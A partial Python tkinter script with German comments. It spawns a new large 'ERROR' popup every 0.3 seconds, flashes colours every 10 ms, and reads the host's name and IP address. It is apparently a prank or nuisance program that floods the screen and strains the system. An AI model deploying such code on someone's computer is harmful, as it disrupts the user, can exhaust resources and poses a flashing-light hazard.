...
def change_colors(label, window):
    """Ändert die Farben des Labels und des Fensters."""
    try:
        label.config(fg=random_color(), bg=random_color())
        window.config(bg=random_color())
        window.after(10, change_colors, label, window)  # sehr schnell
    except Exception as e:
        print(f"Fehler beim Ändern der Farben: {e}")
...
def create_popup():
    ...
    try:
        ...
        window.geometry("1200x1080")  # Startgröße
        ...
        label = tk.Label(window, text="ERROR", font=("Arial", 30))
        label.pack(expand=True, fill="both")

        change_colors(label, window)
    except Exception as e:
        print(f"Fehler beim Erstellen des Popups: {e}")

def spawn():
    """Erzeugt ein neues Popup-Fenster in regelmäßigen Abständen."""
    try:
        create_popup()
        root.after(300, spawn)  # neues Popup alle 0,3 Sekunden
    except Exception as e:
        print(f"Fehler beim Spawnen des Popups: {e}")
def get_ip_info():
    """Erhält die IP-Informationen des Hosts."""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return f"Hostname: {hostname}, IP Adresse: {ip_address}"
    except Exception as e:
        print(f"Fehler beim Abrufen der IP-Informationen: {e}")
        return "Fehler beim Abrufen der IP-Informationen"
